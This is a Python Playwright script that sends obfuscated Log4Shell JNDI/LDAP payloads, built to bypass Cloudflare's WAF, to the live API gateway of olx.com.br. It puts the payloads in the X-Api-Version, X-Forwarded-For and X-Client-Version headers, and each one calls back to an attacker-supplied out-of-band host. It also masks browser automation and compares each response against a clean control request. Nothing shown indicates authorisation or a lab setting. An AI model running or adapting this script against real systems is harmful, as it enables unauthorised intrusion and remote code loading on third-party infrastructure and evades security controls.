#!/usr/bin/env python3
"""Control test (clean vs payload) + advanced CF-WAF-bypass Log4Shell variants on apigw."""
import sys, time
from playwright.sync_api import sync_playwright
OOB = sys.argv[1]
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"

variants = {
 "clean_control": None,
 "adv_dash":  "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://advd."+OOB+"/a}",
 "adv_env":   "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://adve."+OOB+"/a}",
 "adv_date":  "${${date:'j'}ndi:ldap://advdt."+OOB+"/a}",
 "adv_upper": "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://advu."+OOB+"/a}",
}

with sync_playwright() as p:
    ctx = p.chromium.launch_persistent_context(user_data_dir="/tmp/olx_prof3", channel="chrome",
        headless=True, locale="pt-BR", user_agent=UA,
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR","--disable-blink-features=AutomationControlled"])
    pg = ctx.pages[0] if ctx.pages else ctx.new_page()
    try: pg.goto("https://www.olx.com.br/", wait_until="domcontentloaded", timeout=40000)
    except: pass
    time.sleep(2)
    cur = {"pl":None}
    def handler(route):
        if cur["pl"] is None:
            try: route.continue_();
            except: pass
            return
        h = dict(route.request.headers)
        h["X-Api-Version"]=cur["pl"]; h["X-Forwarded-For"]=cur["pl"]; h["X-Client-Version"]=cur["pl"]
        try: route.continue_(headers=h)
        except:
            try: route.continue_()
            except: pass
    pg.route("**/*", handler)
    for name,pl in variants.items():
        cur["pl"]=pl
        try:
            r = pg.goto("https://apigw.olx.com.br/", wait_until="domcontentloaded", timeout=30000)
            print(f"{name:16} status={r.status if r else '?'}")
        except Exception as e:
            print(f"{name:16} ERR {repr(e)[:50]}")
        time.sleep(2)
    ctx.close()
print("done")
